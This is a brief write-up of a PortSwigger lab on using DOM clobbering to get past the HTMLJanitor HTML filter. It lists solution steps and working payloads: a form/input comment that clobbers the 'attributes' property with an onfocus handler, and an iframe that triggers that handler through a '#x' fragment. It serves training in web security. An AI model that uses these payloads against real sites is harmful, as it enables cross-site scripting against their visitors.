# Lab: Clobbering DOM attributes to bypass HTML filters

**Official lab:** [https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)

## Lab idea

This lab uses the HTMLJanitor library and a DOM-clobbering weakness in the context of HTML filtering. It practices understanding how injected markup can alter DOM properties or application assumptions and undermine a filter.

## Vulnerability in brief
The Document Object Model (DOM) is the browser’s structured representation of a page and its elements. DOM manipulation is routine; vulnerabilities arise when client-side JavaScript takes attacker-controllable data from a **source** and passes it unsafely to a potentially dangerous **sink**. This topic is a family of client-side vulnerability classes, not a general learning or testing category. DOM-based cross-site scripting is commonly abbreviated **DOM XSS**.

## Solution idea
1. Go to one of the blog posts and create a comment containing the following HTML: <form id=x tabindex=0 onfocus=print()><input id=attributes>
2. Go to the exploit server and add the following iframe to the body: <iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3…
3. Store the exploit and deliver it to the victim.

## Payloads / key values
- `<form id=x tabindex=0 onfocus=print()><input id=attributes>`
- `iframe`
- `<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">`
- `postId`
- `print()`
- `attributes`
- `form`
- `onfocus`
- `#x`
- `"x"`

## Official source
- [PortSwigger Academy: Lab: Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)
